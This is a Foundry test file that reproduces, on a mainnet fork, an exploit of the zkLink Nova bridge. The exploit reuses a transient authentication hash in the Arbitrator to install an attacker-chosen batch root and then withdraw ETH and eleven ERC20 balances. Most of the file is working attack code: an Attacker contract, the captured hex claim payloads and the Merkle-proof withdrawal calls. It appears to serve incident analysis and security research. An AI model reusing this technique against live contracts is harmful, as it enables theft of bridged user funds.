// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~783K USD (reported, across both exploit txs); this PoC reconstructs the
//   first tx, which drains 22.431294525563808989 ETH plus 11 ERC20 balances listed below.
// Attacker EOA (fund recipient) : https://etherscan.io/address/0xaCA0655a11200A80d33D0E48786317304cDE5718
// Attacker contract (entry)     : 0xD5f162B68a0281686E8Dc76dB8d67d2f3E6Aff07
// Vulnerable Arbitrator         : https://etherscan.io/address/0x1Ee09A2cAa0813A5183f90F5a6d0E4871f4C6002
// Public relayer                : https://etherscan.io/address/0x0FDC28e64772a70109d10fd068f859cFa7Dea2c6
// EthereumGateway               : https://etherscan.io/address/0x83Bc7394738A7A084081aF22EEC0051908c0055c
// Victim ZkLink                 : https://etherscan.io/address/0x5fD9F73286b7E8683Bab45019C94553b93e015Cf
// Victim L1ERC20Bridge          : https://etherscan.io/address/0xAd16eDCF7DEB7e90096A259c81269d811544B6B6
// Exploit tx                    : https://etherscan.io/tx/0x4f3c23e75b9134e8cae5a462550daad42fbbc19242567fcc34c0a035e297462c
//
// @Summary
// zkLink Nova's L1 Arbitrator authenticates a cross-chain message claim with a transient hash. In
// claimMessage it sets a transient `claiming` flag and relies on a transient `finalizeMessageHash`
// that a source-chain claim callback populates through receiveMessage. It never clears either value
// and does not require a fresh authentication per invocation, so within one transaction a second
// claimMessage reuses the hash the first one left behind.
//
// The borrower of that hash is permissionless. SyncL2TxHashRelayer.claimPrimaryChainSyncL2TxHashMessage
// is external with no role, key or whitelist, and forwards attacker-supplied data into the Arbitrator.
// The attacker calls it once to populate a valid transient hash (a legitimate syncL2TxHash relay),
// then calls it again reusing that hash while pointing the claim target at EthereumGateway.sendMessage.
// That executes ZkLink.syncBatchRoot under the gateway identity and installs an attacker-chosen
// l2LogsRootHash for batch 116409. With that root in place the attacker finalizes withdrawals whose
// Merkle proofs really verify against it, draining the L1 escrow and the ERC20 bridge.
//
// @Reconstruction notes (honesty)
// - No vm.mock, no vm.store, no vm.prank of any protocol identity. A fresh attacker contract drives
//   the real public relayer, the real Arbitrator, the real EthereumGateway and the real ZkLink.
// - The installed root (0x1934a1c3...) and every withdrawal message and Merkle proof are the
//   attacker's real on-chain values. proveL2MessageInclusion (the real on-chain verifier) is called
//   live by finalizeEthWithdrawal / finalizeWithdrawal and accepts the proofs because the root is
//   installed through the legitimate syncBatchRoot code path, not written directly.
// - The two relayer calls happen inside one transaction (Attacker.attack), as the transient-reuse
//   bug requires. Withdrawn funds go to the recipient encoded in the real L2->L1 messages
//   (0xaCA0655a...), which cannot be altered without invalidating the proofs.
//
// Run:
// forge test --contracts src/test/2026-10/ZkLinkNovaBridge_exp.sol --evm-version cancun -vvv

interface ISyncL2TxHashRelayer {
    function claimPrimaryChainSyncL2TxHashMessage(
        address sourceChainCanonicalMessageService,
        bytes calldata sourceChainClaimCallData,
        address secondaryChainL1Gateway,
        bytes32 secondaryChainL2TxHash,
        bytes32 primaryChainL2TxHash,
        bytes calldata forwardParams
    ) external payable;
}

interface IZkLink {
    function finalizeEthWithdrawal(
        uint256 l2BatchNumber,
        uint256 l2MessageIndex,
        uint16 l2TxNumberInBatch,
        bytes calldata message,
        bytes32[] calldata merkleProof
    ) external;
    function totalBatchesExecuted() external view returns (uint256);
}

interface IL1ERC20Bridge {
    function finalizeWithdrawal(
        uint256 l2BatchNumber,
        uint256 l2MessageIndex,
        uint16 l2TxNumberInBatch,
        bytes calldata message,
        bytes32[] calldata merkleProof
    ) external;
}

contract ZkLinkNovaBridge_exp is Test {
    ISyncL2TxHashRelayer constant RELAYER = ISyncL2TxHashRelayer(0x0FDC28e64772a70109d10fd068f859cFa7Dea2c6);
    IZkLink constant ZKLINK = IZkLink(0x5fD9F73286b7E8683Bab45019C94553b93e015Cf);
    IL1ERC20Bridge constant BRIDGE = IL1ERC20Bridge(0xAd16eDCF7DEB7e90096A259c81269d811544B6B6);
    address constant RECIPIENT = 0xaCA0655a11200A80d33D0E48786317304cDE5718;

    uint256 constant FORK_BLOCK = 26294187; // parent of the exploit tx block 26294188
    uint256 constant BATCH = 116409;

    address[11] TOKENS = [
        0xD9A442856C234a39a81a089C06451EBAa4306a72,
        0xbf5495Efe5DB9ce00f80364C8B423567e58d2110,
        0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
        0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7,
        0x7122985656e38BDC0302Db86685bb972b145bD3C,
        0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599,
        0xdAC17F958D2ee523a2206206994597C13D831ec7,
        0x32bd822d615A3658A68b6fDD30c2fcb2C996D678,
        0x49446A0874197839D15395B908328a74ccc96Bc0,
        0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0,
        0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0
    ];
    uint256[11] AMOUNTS = [
        uint256(245737898851061074796),
        uint256(12569253862270157793),
        uint256(18113448053),
        uint256(6866471599990000000),
        uint256(6299750644063014297),
        uint256(17360197),
        uint256(3360898152),
        uint256(2482619199006740438),
        uint256(2637205770100000000),
        uint256(465958551040794797),
        uint256(500000001000000018)
    ];
    uint256 constant ETH_DRAIN = 22431294525563808989;

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
    }

    function testExploit() public {
        uint256 ethBefore = RECIPIENT.balance;
        uint256[11] memory tokBefore;
        for (uint256 i; i < 11; ++i) tokBefore[i] = IERC20(TOKENS[i]).balanceOf(RECIPIENT);

        Attacker attacker = new Attacker();
        attacker.attack();

        uint256 ethGained = RECIPIENT.balance - ethBefore;
        console.log("ETH drained to attacker :", ethGained);
        assertEq(ethGained, ETH_DRAIN, "eth drain mismatch");

        for (uint256 i; i < 11; ++i) {
            uint256 gained = IERC20(TOKENS[i]).balanceOf(RECIPIENT) - tokBefore[i];
            console.log("token", TOKENS[i]);
            console.log("  drained :", gained);
            assertEq(gained, AMOUNTS[i], "erc20 drain mismatch");
        }
    }

    // Negative control: without the second relayer call that installs the attacker root via
    // syncBatchRoot, the very first withdrawal has no valid root to prove against and reverts.
    function testWithoutRootInstallReverts() public {
        Attacker attacker = new Attacker();
        vm.expectRevert();
        attacker.populateOnlyThenWithdraw();
    }
}

contract Attacker {
    ISyncL2TxHashRelayer constant RELAYER = ISyncL2TxHashRelayer(0x0FDC28e64772a70109d10fd068f859cFa7Dea2c6);
    IZkLink constant ZKLINK = IZkLink(0x5fD9F73286b7E8683Bab45019C94553b93e015Cf);
    IL1ERC20Bridge constant BRIDGE = IL1ERC20Bridge(0xAd16eDCF7DEB7e90096A259c81269d811544B6B6);

    address constant MESSAGE_PROXY = 0xd19d4B5d358258f05D7B411E21A1460D11B0876F; // source-chain canonical message service
    address constant GATEWAY = 0x83Bc7394738A7A084081aF22EEC0051908c0055c; // EthereumGateway
    bytes32 constant SEC_L2TXHASH = 0x25754f570125e0f3e6b56827aae2ae7c5875a2044996f6f455569bd02bbffadc;
    bytes32 constant PRI_L2TXHASH = 0xe9ec340b8d65c0ad35a637e9427060bd097b840dca668ddbaf1c40c4b146ba52;

    // Attacker claim payloads captured on-chain. These are the `bytes` arguments the relayer forwards
    // into Arbitrator.claimMessage: call A performs a legitimate syncL2TxHash relay (populating the
    // transient hash); call B reuses that hash and points the claim at EthereumGateway.sendMessage,
    // which runs ZkLink.syncBatchRoot and installs the attacker root for batch 116409.
    bytes constant CLAIM_A = hex"6463fb2a00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000140000000000000000000000000000000000000000000000000000000000001a87a00000000000000000000000000000000000000000000000000000000000000010000000000000000000000007b5780d6df85a7df96a3e1a019639a1dbde937db000000000000000000000000803460416c2682ac54fccf03ef77b10a12f2809b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000aca0655a11200a80d33d0e48786317304cde5718a9fb0e303e7083c597fb420fe3aeb366f136e9c034831bd304584432b10e95cf00000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000005104f565663a59e1bc500f935ecb6f9b6146d5fa76f77dca3d6ebd0871b6442c9ad3228b676f7d3cd4284a5443f17f1962b36e491b30a40b2405849e597ba5fb5b4c11951957c6f8f642c4af61cd6b24640fec6dc7fc607ee8206a99e92410d3021ddb9a356815c3fac1026b6dec5df3124afbadb485c9ba5a3e3398a04b7ba85e58769b32a1beaf1ea27375a44095a0d1fb664ce2dd358e7fcbfb78c26a1934400000000000000000000000000000000000000000000000000000000000001c4031e7b6100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000e000000000000000000000000083bc7394738a7a084081af22eec0051908c0055c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000044e0a1bf7225754f570125e0f3e6b56827aae2ae7c5875a2044996f6f455569bd02bbffadce9ec340b8d65c0ad35a637e9427060bd097b840dca668ddbaf1c40c4b146ba520000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
    bytes constant FORWARD_A = hex"0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000";
    bytes constant CLAIM_B = hex"6ea9cec900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000645e78d327000000000000000000000000000000000000000000000000000000000001c6b91934a1c3012c75044c93af32f9e2693f56ee3682393623a0f41fec237f915ea80000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
    bytes constant FORWARD_B = hex"0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000";

    // Step 1 (populate) + step 2 (reuse -> install root) happen in this single call, then withdraw.
    function attack() external {
        _populate();
        _installRoot();
        _withdrawAll();
    }

    // Negative control path: populate only, skip the root install, then attempt the first withdrawal.
    function populateOnlyThenWithdraw() external {
        _populate();
        _firstEthWithdrawal();
    }

    function _populate() internal {
        RELAYER.claimPrimaryChainSyncL2TxHashMessage(
            MESSAGE_PROXY, CLAIM_A, GATEWAY, SEC_L2TXHASH, PRI_L2TXHASH, FORWARD_A
        );
    }

    function _installRoot() internal {
        RELAYER.claimPrimaryChainSyncL2TxHashMessage(
            GATEWAY, CLAIM_B, GATEWAY, SEC_L2TXHASH, PRI_L2TXHASH, FORWARD_B
        );
    }

    function _firstEthWithdrawal() internal {
        bytes32[] memory ethProof = new bytes32[](4);
        ethProof[0] = 0x3b404a306ab1922c86ab8c671aded171edcbe33a9c7135eb64ebcc9efeab6fa3;
        ethProof[1] = 0xf3037cd20e3dabb79846cedd016beac6e676a6f175d405e8114f71b7feee4969;
        ethProof[2] = 0xbf06b0fb7563b2a098af7067afbe0c5b645af1b342d6b336f62b6cd0445338a6;
        ethProof[3] = 0xeb96bef21f0149807d031b8c1799f757e9bd7bd30641f35ce70b030dcdbbbdb5;
        ZKLINK.finalizeEthWithdrawal(116409, 0, 1, hex"6c0960f983bc7394738a7a084081af22eec0051908c0055c000000000000000000000000000000000000000000000001374bf78660652cdd0000000000000000000000000000000000000000000000000000000000000000aca0655a11200a80d33d0e48786317304cde5718", ethProof);
    }

    function _withdrawAll() internal {
        _firstEthWithdrawal();
        bytes32[] memory p0 = new bytes32[](4);
        p0[0] = 0xe7eb4b7b740f32ea63554dbfd0eb7102ecd8354557804b115d937521c84f7f05;
        p0[1] = 0xf3037cd20e3dabb79846cedd016beac6e676a6f175d405e8114f71b7feee4969;
        p0[2] = 0xbf06b0fb7563b2a098af7067afbe0c5b645af1b342d6b336f62b6cd0445338a6;
        p0[3] = 0xeb96bef21f0149807d031b8c1799f757e9bd7bd30641f35ce70b030dcdbbbdb5;
        BRIDGE.finalizeWithdrawal(116409, 1, 2, hex"11a2ccc1aca0655a11200a80d33d0e48786317304cde5718d9a442856c234a39a81a089c06451ebaa4306a7200000000000000000000000000000000000000000000000d524c6507a45e0b6c", p0);

        bytes32[] memory p1 = new bytes32[](4);
        p1[0] = 0x10798f1d15f0bae4ecb93f78a667038912c8e4599c0c84cf8cce84a2dfda0b66;
        p1[1] = 0x8e3cfd4ba5862d4b7005d652702f6a713e2e86d3c456bd5fc76b891e1a8b114c;
        p1[2] = 0xbf06b0fb7563b2a098af7067afbe0c5b645af1b342d6b336f62b6cd0445338a6;
        p1[3] = 0xeb96bef21f0149807d031b8c1799f757e9bd7bd30641f35ce70b030dcdbbbdb5;
        BRIDGE.finalizeWithdrawal(116409, 2, 3, hex"11a2ccc1aca0655a11200a80d33d0e48786317304cde5718bf5495efe5db9ce00f80364c8b423567e58d2110000000000000000000000000000000000000000000000000ae6ef5cb0051c3e1", p1);

        bytes32[] memory p2 = new bytes32[](4);
        p2[0] = 0x0f3fef0ceefefd05837f849c3f3da763aa39d742fc41803d6f798311cba0441a;
        p2[1] = 0x8e3cfd4ba5862d4b7005d652702f6a713e2e86d3c456bd5fc76b891e1a8b114c;
        p2[2] = 0xbf06b0fb7563b2a098af7067afbe0c5b645af1b342d6b336f62b6cd0445338a6;
        p2[3] = 0xeb96bef21f0149807d031b8c1799f757e9bd7bd30641f35ce70b030dcdbbbdb5;
        BRIDGE.finalizeWithdrawal(116409, 3, 4, hex"11a2ccc1aca0655a11200a80d33d0e48786317304cde5718a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000000000000000000000000000000000000437a54875", p2);

        bytes32[] memory p3 = new bytes32[](4);
        p3[0] = 0x0fb2827725e4d27a86c48cffbbf2faecd5b1e4f610510e86a09a1f0af370ca99;
        p3[1] = 0x09ec755596f1d43a62c0e660a3be36fc373bb893629d1a955266ef86b65efa4e;
        p3[2] = 0x6c123bece3fd6382a25ffe920516a02f06d9f75014935a5683700b6c6813f1a9;
        p3[3] = 0xeb96bef21f0149807d031b8c1799f757e9bd7bd30641f35ce70b030dcdbbbdb5;
        BRIDGE.finalizeWithdrawal(116409, 4, 5, hex"11a2ccc1aca0655a11200a80d33d0e48786317304cde5718a1290d69c65a6fe4df752f95823fae25cb99e5a70000000000000000000000000000000000000000000000005f4a9b8a41b64980", p3);

        bytes32[] memory p4 = new bytes32[](4);
        p4[0] = 0x9954f1b8b0a08dd1f6e7fb4f81c81f07c862ceb4beae9f750ce3840305779390;
        p4[1] = 0x09ec755596f1d43a62c0e660a3be36fc373bb893629d1a955266ef86b65efa4e;
        p4[2] = 0x6c123bece3fd6382a25ffe920516a02f06d9f75014935a5683700b6c6813f1a9;
        p4[3] = 0xeb96bef21f0149807d031b8c1799f757e9bd7bd30641f35ce70b030dcdbbbdb5;
        BRIDGE.finalizeWithdrawal(116409, 5, 6, hex"11a2ccc1aca0655a11200a80d33d0e48786317304cde57187122985656e38bdc0302db86685bb972b145bd3c000000000000000000000000000000000000000000000000576d35d550ea0d99", p4);

        bytes32[] memory p5 = new bytes32[](4);
        p5[0] = 0x39f8985d361bc5ee33c4bd94c4ad856802f3a5250de06fb12a017692159f5be3;
        p5[1] = 0x6b08dbd99a009a6aed5560b15376cadd3dafa335fcdb4e6626d948eedba8f584;
        p5[2] = 0x6c123bece3fd6382a25ffe920516a02f06d9f75014935a5683700b6c6813f1a9;
        p5[3] = 0xeb96bef21f0149807d031b8c1799f757e9bd7bd30641f35ce70b030dcdbbbdb5;
        BRIDGE.finalizeWithdrawal(116409, 6, 7, hex"11a2ccc1aca0655a11200a80d33d0e48786317304cde57182260fac5e5542a773aa44fbcfedf7c193bc2c599000000000000000000000000000000000000000000000000000000000108e545", p5);

        bytes32[] memory p6 = new bytes32[](4);
        p6[0] = 0x1db57452b2a2ed963eb3e8844b15fa409a7642c2dc8ead19962ad83bf3bfae19;
        p6[1] = 0x6b08dbd99a009a6aed5560b15376cadd3dafa335fcdb4e6626d948eedba8f584;
        p6[2] = 0x6c123bece3fd6382a25ffe920516a02f06d9f75014935a5683700b6c6813f1a9;
        p6[3] = 0xeb96bef21f0149807d031b8c1799f757e9bd7bd30641f35ce70b030dcdbbbdb5;
        BRIDGE.finalizeWithdrawal(116409, 7, 8, hex"11a2ccc1aca0655a11200a80d33d0e48786317304cde5718dac17f958d2ee523a2206206994597c13d831ec700000000000000000000000000000000000000000000000000000000c8533c68", p6);

        bytes32[] memory p7 = new bytes32[](4);
        p7[0] = 0x002b5d866dba037384cf251d6310633915367bcce7d370d7204e4573e4286f09;
        p7[1] = 0xced83994efb47160d8a10d3656180711016cd525317936c6dd8cb13863562fa2;
        p7[2] = 0xe23df313e89d8dd0a926388a8a5197e6479976b405766d228ece792379dbed65;
        p7[3] = 0xd61472757da4ce904559a5c23f00d59c07196afe31755fcc205c10d073e917c6;
        BRIDGE.finalizeWithdrawal(116409, 8, 9, hex"11a2ccc1aca0655a11200a80d33d0e48786317304cde571832bd822d615a3658a68b6fdd30c2fcb2c996d678000000000000000000000000000000000000000000000000227409020d5c8fd6", p7);

        bytes32[] memory p8 = new bytes32[](4);
        p8[0] = 0xa3842f267d630a3a51ad80ecbe2060a936cc328217f9aa19325b445d94b5d448;
        p8[1] = 0xced83994efb47160d8a10d3656180711016cd525317936c6dd8cb13863562fa2;
        p8[2] = 0xe23df313e89d8dd0a926388a8a5197e6479976b405766d228ece792379dbed65;
        p8[3] = 0xd61472757da4ce904559a5c23f00d59c07196afe31755fcc205c10d073e917c6;
        BRIDGE.finalizeWithdrawal(116409, 9, 10, hex"11a2ccc1aca0655a11200a80d33d0e48786317304cde571849446a0874197839d15395b908328a74ccc96bc000000000000000000000000000000000000000000000000024993cace66bc500", p8);

        bytes32[] memory p9 = new bytes32[](4);
        p9[0] = 0x1d7d63b67a34d746f455b8cb2fc085dca43f18b51afcbfc90e669939c3a934a8;
        p9[1] = 0xc8b7295e57fa16bd1963041cd5fdbf8efcb053bb829d047177c5d90522946ec9;
        p9[2] = 0xe23df313e89d8dd0a926388a8a5197e6479976b405766d228ece792379dbed65;
        p9[3] = 0xd61472757da4ce904559a5c23f00d59c07196afe31755fcc205c10d073e917c6;
        BRIDGE.finalizeWithdrawal(116409, 10, 11, hex"11a2ccc1aca0655a11200a80d33d0e48786317304cde57187f39c581f595b53c5cb19bd0b3f8da6c935e2ca000000000000000000000000000000000000000000000000006776ad55ad7a0ad", p9);

        bytes32[] memory p10 = new bytes32[](4);
        p10[0] = 0x3c59295f720ac3048a095c5bceeeec04ea8f0acbaab3af5e74e2b488b2fcd7b2;
        p10[1] = 0xc8b7295e57fa16bd1963041cd5fdbf8efcb053bb829d047177c5d90522946ec9;
        p10[2] = 0xe23df313e89d8dd0a926388a8a5197e6479976b405766d228ece792379dbed65;
        p10[3] = 0xd61472757da4ce904559a5c23f00d59c07196afe31755fcc205c10d073e917c6;
        BRIDGE.finalizeWithdrawal(116409, 11, 12, hex"11a2ccc1aca0655a11200a80d33d0e48786317304cde5718fae103dc9cf190ed75350761e95403b7b8afa6c000000000000000000000000000000000000000000000000006f05b5a0f4cca12", p10);
    }
}
